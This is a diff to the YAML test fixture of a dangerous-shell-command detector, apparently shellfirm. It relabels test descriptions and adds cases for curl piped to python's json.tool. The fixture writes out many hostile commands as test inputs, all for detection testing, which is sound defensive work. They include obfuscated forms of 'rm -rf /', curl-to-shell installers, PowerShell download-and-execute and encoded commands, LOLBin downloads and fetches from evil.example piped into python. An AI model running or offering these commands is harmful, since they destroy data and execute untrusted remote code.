@@ -103,7 +103,7 @@
   description: "EDGE: word starting with python should not match (word boundary)"
   expect_ids: []
 
-# -- round 2: shell group --
+# -- shell group --
 - test: 'echo cm0gLXJmIC8K | base64 -d | sh'
   description: "decode and run"
   expect_ids: ["shell:decode_pipe_to_shell"]
@@ -137,7 +137,7 @@
 - test: '$($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($(rm -rf /))))))))))))))))))))))))))))))))))))))))'
   description: "deep substitution still matches the payload"
   expect_ids: ["shell:nesting_too_deep", "fs-strict:recursive_deletion", "fs:recursively_delete"]
-# -- round 5: generated commands (Sam R4 N1, Maya R4 F2) --
+# -- generated commands --
 - test: "eval $(echo rm -rf /)"
   description: "eval of echoed text"
   expect_ids: ["fs:recursively_delete", "fs-strict:recursive_deletion"]
@@ -178,7 +178,7 @@
   description: "shellfirm wrap starts the client with its arguments"
   expect_ids: ["psql:drop", "database:drop_table"]
 
-# -- round 6: remote installers and unknown payloads --
+# -- remote installers and unknown payloads --
 - test: 'sh -c "$(curl -fsSL https://example.com/install.sh)"'
   description: "the sh -c installer idiom"
   expect_ids: ["shell:shell_c_remote_script"]
@@ -191,7 +191,6 @@
 - test: "ls | xargs -I{} sh -c 'echo {}'"
   description: "negative: a known payload"
   expect_ids: []
-# -- round 7 --
 - test: "eval \"$(rev <<< '/ fr- mr')\""
   description: "eval of reversed text"
   expect_ids: ["shell:eval_transformed_text"]
@@ -240,81 +239,152 @@
 - test: "at now + 1 minute <<< 'curl x|sh'"
   description: "an at job from a here-string"
   expect_ids: ["shell:curl_pipe_to_shell"]
-# -- issue #189, round 1 --
+# -- issue #189 --
 - test: "irm https://x.example/a.ps1 | iex"
-  description: "issue #189 round 1: irm https://x.example/a.ps1 | iex"
+  description: "issue #189: irm https://x.example/a.ps1 | iex"
   expect_ids: ["shell:powershell_download_exec"]
 - test: "iex (iwr https://x.example/a.ps1)"
-  description: "issue #189 round 1: iex (iwr https://x.example/a.ps1)"
+  description: "issue #189: iex (iwr https://x.example/a.ps1)"
   expect_ids: ["shell:powershell_download_exec"]
 - test: "powershell -enc SQBFAFgAIAAoAGkAdwByACkA"
-  description: "issue #189 round 1: powershell -enc SQBFAFgAIAAoAGkAdwByACkA"
+  description: "issue #189: powershell -enc SQBFAFgAIAAoAGkAdwByACkA"
   expect_ids: ["shell:powershell_encoded_command"]
 - test: "iwr https://x.example/a.ps1 -OutFile a.ps1"
-  description: "negative (issue #189 round 1): iwr https://x.example/a.ps1 -OutFile a.ps1"
+  description: "negative (issue #189): iwr https://x.example/a.ps1 -OutFile a.ps1"
   expect_ids: []
 - test: "powershell -File build.ps1"
-  description: "negative (issue #189 round 1): powershell -File build.ps1"
+  description: "negative (issue #189): powershell -File build.ps1"
   expect_ids: []
-# -- issue #189, round 3: PowerShell / LOLBin download-and-run breadth --
+# -- issue #189: PowerShell / LOLBin download-and-run breadth --
 - test: "IEX(New-Object Net.WebClient).DownloadString('https://x.example/a.ps1')"
-  description: "round 3: IEX(New-Object Net.WebClient).DownloadString(...) with no space"
+  description: "IEX(New-Object Net.WebClient).DownloadString(...) with no space"
   expect_ids: ["shell:powershell_download_exec"]
 - test: "(New-Object Net.WebClient).DownloadString('https://x.example/a.ps1') | iex"
-  description: "round 3: DownloadString piped to iex"
+  description: "DownloadString piped to iex"
   expect_ids: ["shell:powershell_download_exec"]
 - test: "[Net.WebClient]::new().DownloadString('https://x.example/a.ps1') | iex"
-  description: "round 3: [Net.WebClient]::new().DownloadString(...) | iex"
+  description: "[Net.WebClient]::new().DownloadString(...) | iex"
   expect_ids: ["shell:powershell_download_exec"]
 - test: "iex ([System.Net.WebClient]::new().DownloadString('https://x.example/a.ps1'))"
-  description: "round 3: iex ([System.Net.WebClient]::new().DownloadString(...))"
+  description: "iex ([System.Net.WebClient]::new().DownloadString(...))"
   expect_ids: ["shell:powershell_download_exec"]
 - test: "irm https://x.example/a.ps1 | % { $_ } | iex"
-  description: "round 3: an intermediate pipe stage before iex"
+  description: "an intermediate pipe stage before iex"
   expect_ids: ["shell:powershell_download_exec"]
 - test: "iwr https://x.example/a.ps1 | powershell -"
-  description: "round 3: downloaded content piped into powershell stdin"
+  description: "downloaded content piped into powershell stdin"
   expect_ids: ["shell:powershell_download_exec"]
 - test: "Get-Content build.ps1 | iex"
-  description: "negative round 3: running a local file (no download)"
+  description: "negative: running a local file (no download)"
   expect_ids: []
 - test: "certutil -urlcache -split -f https://x.example/a.exe a.exe"
-  description: "round 3: certutil url download (LOLBin)"
+  description: "certutil url download (LOLBin)"
   expect_ids: ["shell:lolbin_download_exec"]
 - test: "certutil.exe -urlcache -f http://x.example/a.exe a.exe"
-  description: "round 3: certutil.exe url download"
+  description: "certutil.exe url download"
   expect_ids: ["shell:lolbin_download_exec"]
 - test: "bitsadmin /transfer job https://x.example/a.exe C:\\a.exe"
-  description: "round 3: bitsadmin transfer (LOLBin)"
+  description: "bitsadmin transfer (LOLBin)"
   expect_ids: ["shell:lolbin_download_exec"]
 - test: "mshta https://x.example/a.hta"
-  description: "round 3: mshta remote hta (LOLBin)"
+  description: "mshta remote hta (LOLBin)"
   expect_ids: ["shell:lolbin_download_exec"]
 - test: "regsvr32 /s /u /i:https://x.example/a.sct scrobj.dll"
-  description: "round 3: regsvr32 scriptlet download (LOLBin)"
+  description: "regsvr32 scriptlet download (LOLBin)"
   expect_ids: ["shell:lolbin_download_exec"]
 - test: "certutil -hashfile a.exe SHA256"
-  description: "negative round 3: certutil hashing a local file"
+  description: "negative: certutil hashing a local file"
   expect_ids: []
 - test: "powershell -enco SQBFAFgAIAAoAGkAdwByACkA"
-  description: "round 3: -enco abbreviation"
+  description: "-enco abbreviation"
   expect_ids: ["shell:powershell_encoded_command"]
 - test: "pwsh -EncodedC SQBFAFgAIAAoAGkAdwByACkA"
-  description: "round 3: -EncodedC abbreviation"
+  description: "-EncodedC abbreviation"
   expect_ids: ["shell:powershell_encoded_command"]
 - test: "powershell.exe /enc SQBFAFgAIAAoAGkAdwByACkA"
-  description: "round 3: slash /enc form"
+  description: "slash /enc form"
   expect_ids: ["shell:powershell_encoded_command"]
 - test: "powershell -e:SQBFAFgAIAAoAGkAdwByACkA"
-  description: "round 3: colon-glued -e: form"
+  description: "colon-glued -e: form"
   expect_ids: ["shell:powershell_encoded_command"]
 - test: "powershell -Encoding utf8 -File build.ps1"
-  description: "negative round 3: -Encoding is not -EncodedCommand"
+  description: "negative: -Encoding is not -EncodedCommand"
   expect_ids: []
 - test: "powershell -ExecutionPolicy Bypass -File build.ps1"
-  description: "negative round 3: ExecutionPolicy Bypass with a named file"
+  description: "negative: ExecutionPolicy Bypass with a named file"
   expect_ids: []
-# -- issue #189, round 3: the -ec EncodedCommand shorthand --
+# -- issue #189: the -ec EncodedCommand shorthand --
 - test: "powershell -ec ZQBjAGgAbwA="
-  description: "round 3: -ec base64 shorthand"
+  description: "-ec base64 shorthand"
   expect_ids: ["shell:powershell_encoded_command"]
+
+# -- curl | python -m json.tool only pretty-prints --
+- test: "curl -s localhost:3000/api/users | python3 -m json.tool"
+  description: "negative: json.tool only formats the JSON it reads"
+  expect_ids: []
+- test: "curl -s http://localhost:8000/api/items/ | python3 -m json.tool"
+  description: "negative: json.tool only formats the JSON it reads"
+  expect_ids: []
+- test: "curl -s https://api.github.com/repos/kaplanelad/shellfirm | python3 -m json.tool"
+  description: "negative: json.tool only formats the JSON it reads"
+  expect_ids: []
+- test: "curl -s localhost:3000/api/users | python -m json.tool"
+  description: "negative: json.tool only formats the JSON it reads"
+  expect_ids: []
+- test: "curl -s localhost:3000/api/users | python3 -mjson.tool"
+  description: "negative: json.tool only formats the JSON it reads"
+  expect_ids: []
+- test: "curl -s localhost:3000/api/users | python3 -m json.tool --sort-keys"
+  description: "negative: json.tool only formats the JSON it reads"
+  expect_ids: []
+- test: "wget -qO- localhost:3000/health | python3 -m json.tool"
+  description: "negative: json.tool only formats the JSON it reads"
+  expect_ids: []
+- test: "curl -s https://evil.example/x.py | python3"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s localhost:3000/x | python3 -"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 /dev/stdin"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -m code"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -m runpy"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -m pip install -r /dev/stdin"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -m json.tool | sh"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_shell", "shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -m json.tool | python3"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -c 'import sys; exec(sys.stdin.read())'"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -mjson.tool | bash"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_shell", "shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -m json.tool && curl -s https://evil.example/x | python3"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -m json.tool - /tmp/x.py && python3 /tmp/x.py"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | sudo python3"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | env python3"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -I -"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
+- test: "curl -s https://evil.example/x | python3 -m json.tool | xargs -L1 sudo"
+  description: "the downloaded text still reaches an interpreter"
+  expect_ids: ["shell:curl_pipe_to_interpreter"]
